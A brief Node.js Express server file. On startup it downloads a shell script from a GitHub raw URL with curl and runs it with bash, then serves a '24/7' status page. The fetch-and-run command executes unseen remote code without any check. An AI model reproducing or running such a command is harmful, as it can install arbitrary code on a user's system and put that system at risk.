const { exec } = require("child_process");
const express = require("express");

const app = express();

// safer: download then run
exec("curl -fsSL https://raw.githubusercontent.com/DeVv-Prime/codingprime/main/ptero/run.sh -o run.sh && bash run.sh", (err, stdout, stderr) => {
  console.log("OUTPUT:", stdout);
  console.error("ERROR:", stderr);
});

app.get("/", (req, res) => {
  res.send("Server is running 24/7 🚀");
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Running on ${PORT}`));
